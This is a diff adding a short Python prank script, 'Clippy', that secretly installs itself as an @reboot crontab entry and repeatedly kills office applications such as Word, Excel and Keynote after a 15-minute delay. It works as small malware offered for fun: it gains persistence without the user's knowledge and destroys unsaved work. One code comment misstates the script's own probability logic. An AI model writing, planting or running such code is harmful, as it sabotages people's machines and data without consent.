@@ -1,0 +1,26 @@
+#!/usr/bin/env python3
+# 'Clippy' by iDoObject
+# have a lot of fun
+import os
+import subprocess
+import time
+import random
+
+cronJobs	= subprocess.check_output("crontab -l", shell = True) # list of current cron jobs
+activeUser	= str(subprocess.check_output("whoami", shell = True))[2:-3] # the active user
+
+def go():
+	while True:
+		processes = str(subprocess.check_output("ps -u " + activeUser, shell = True)) # check running processes for current user
+		if random.randrange(0, 2) != 0: break # will be 0 33.3% of the time giving us a 33.3% chance to actually quit the software
+		for software in ["Word", "Pages", "Excel", "Numbers", "PowerPoint", "Keynote"]:
+			if software in processes:
+				time.sleep(900)
+				os.system("pkill " + software)
+
+
+if os.path.realpath(__file__) in str(cronJobs):	# already in cron
+	go()
+else:
+	os.system("(crontab -l; echo \"@reboot " + os.path.realpath(__file__) + "\" ) | crontab -") # add script to cron so it's run at reboot
+	go()
